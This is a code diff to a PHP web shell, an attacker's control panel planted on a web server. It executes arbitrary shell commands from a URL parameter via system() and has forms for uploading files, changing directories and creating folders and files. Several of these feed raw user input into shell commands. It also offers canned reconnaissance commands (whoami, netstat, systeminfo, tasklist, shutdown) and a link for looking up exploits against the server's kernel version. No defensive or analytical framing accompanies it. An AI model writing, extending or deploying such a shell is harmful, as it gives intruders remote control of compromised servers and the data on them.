@@ -313,7 +313,6 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		<?php
 		if(isset($_GET['action']) & $_GET['action']=="phpinfo"){
 		die(phpinfo());
-		
 		}
 		?>
 	<table width="100%" border="1" cellpadding="20px" cellspacing="0">
@@ -471,7 +470,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								?>
 								<?php
 
-								echo "uname -a : ".php_uname()." (Check Exploit)<br />"; 	
+								echo "uname -a : ".php_uname()." <a href='https://google.com/?s=".php_uname()."'>(Check Exploit)</a><br />"; 	
 								
 								if(ini_get('safe_mode') == '1'){
 									echo 'Safe mode:<font color="red"> ON </font> <a href="?turnoff=">(Turn OFF)</a> <br />';
@@ -500,7 +499,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 								
 								?>
 								
-								<?php echo 'Directory : '.$cwd.' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a>' ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
+								<?php echo "Directory : ".$cwd."  <a href=".$GLOBALS['home_cwd'].">[ home ]</a>"; ?>&nbsp;&nbsp;&nbsp;<?php echo $cwd_links.viewPermsColor($GLOBALS['cwd']); ?>
 								<br>Filesystem Mounted: <?php echo "<span>Free</span> ".viewSize($freeSpace)." of ".viewSize($totalSpace)."  (".(int)($freeSpace/$totalSpace*100)."%)"; ?> 
 								<br>ifconfig : <?=gethostbyname($_SERVER["HTTP_HOST"])?> <a href="http://whois.domaintools.com/<?=gethostbyname($_SERVER["HTTP_HOST"])?>">(Whois)</a>
 								<br />Detected drives: <?=$drives?><br />
@@ -531,7 +530,9 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 			}
 		} 
 		?>
-		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;"><?=system($_GET['cmd'])?></textarea></td>
+		<textarea cols="100%" rows="20" style="background:transparent;outline:none;color:#ffffff;">
+		<?=system($_GET['cmd'])?>
+		</textarea></td>
 		</tr>
 		<?php
 		}
@@ -572,39 +573,44 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 		</tr>
 		<tr>
 			<td>
-				<table width="100%" style="font-size:14px;background:transparent;" cellpadding="20px">
+				<table width="100%" style="font-size:14px;background:transparent;" border="0" cellpadding="20px">
 					<tr>
 						<td>
-							Upload : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value=""/><br /><br /><input type="file" name="file" /> <input type="submit" name="submit" value="Send"/>
+							Upload : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Path Upload" name="path" value="<?php system("CHDIR");?>\"/><br /><br /><input type="file"  name="file" /> <input type="submit" name="submit" value="Send"/>
 						</td>
 						<td>
-							Change Dir : <br /><input type="text" placeholder="C:/xampp/htdocs/shell" name="path" value="C:/xampp/htdocs/shell""/> <input type="submit" name="submit" value="Send"/>
+						<?php 
+						if(isset($_GET['file'])){
+						system("cd ".$_GET['file']);
+						}
+						?>
+							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
+							Change Dir : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" name="file" value="<?php system("CHDIR");?>" /> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
+							</form>
 						</td>
 					</tr>
 					<tr>
 						<td>
 							<?php 
-						if(isset($_GET['mkdir'])){
-						system("mkdir ".$_GET['mkdir']);
+						if(isset($_POST['mkdir'])){
+						system("mkdir ".$_POST['mkdir']);
 						echo " Created ";
 						}
 						?>
-							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
-							Make Dir : <br /><input type="text" placeholder="C:\xampp\htdocs\shell\namafolder" name="mkdir" value=""/> <input type="submit" name="submit" value="Send"/>
+							<form action="<?php $_SERVER['PHP_SELF'];?>" method="post">
+							Make Dir : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;"  name="mkdir" value="<?php system("CHDIR");?>\newFolder"/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
 						    </form>
 						</td>
 						<td>
-							Read File : <br /><input type="text" placeholder="/path/file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
-						</td>
-					</tr>
-					<tr>
-						<td>
-							Make File : <br /><input type="text" placeholder="file.format" name="path" value=""/> <input type="submit" name="submit" value="Send"/>
-						</td>
-						<td>
-							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
-							Execute : <br /><input type="text" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" name="submit" value="Send"/>
-							</form>
+						<?php
+						if(isset($_POST['newfile'])){
+						system("mk ".$_POST['mkdir']);
+						
+						}
+						?>
+						<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
+							Make File : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="file.format" name="newfile" value=""/> <input type="submit" name="submit" style="padding:5px;margin-top:10px;width:50px;" value="Send"/>
+						</form>
 						</td>
 					</tr>
 					<tr>
@@ -614,14 +620,18 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 												  <?php 
 													if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
 												  ?>
-												  <select name="cmd">
+												  <select name="cmd" style="padding:5px;margin-top:10px;width:290px;">
 												  <option value="whoami">Check Priv </option>
 												  <option value="netstat -an">Cek Port Listen</option>
 												  <option value="dir">List Directory</option>
 												  <option value="start cmd.exe">Jalankan Cmd</option>
+												  <option value="tasklist">Task Manager</option>
+												  <option value="systeminfo">System Info</option>
+												  <option value="openfiles">Chek Open Files</option>
+												  <option value="shutdown">Shutdown with message</option>
 												  </select> 
 												  <?php }else{ ?>
-												  <select name="cmd">
+												  <select name="cmd" style="padding:5px;margin-top:10px;width:290px;">
 												  <option value="whoami">Check Priv</option>
 												  <option value="netstat -an">Cek Port Listen</option>
 												  <option value="ls -la">List All hiden File</option>
@@ -632,10 +642,16 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 												  </select> 												  
 												  <?php } ?>
 												 
-							<input type="submit" name="submit" value="Send"/>
+							<input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
+							</form>
+						</td>
+						<td>
+							<form action="<?php $_SERVER['PHP_SELF'];?>" method="get">
+							Execute : <br /><input type="text" style="padding:5px;margin-top:10px;width:290px;" placeholder="Ex : dir,ls,ifconfig" name="cmd" value=""/> <input type="submit" style="padding:5px;margin-top:10px;width:50px;" name="submit" value="Send"/>
 							</form>
 						</td>
 					</tr>
+
 				</table>
 			</td>
 		</tr>
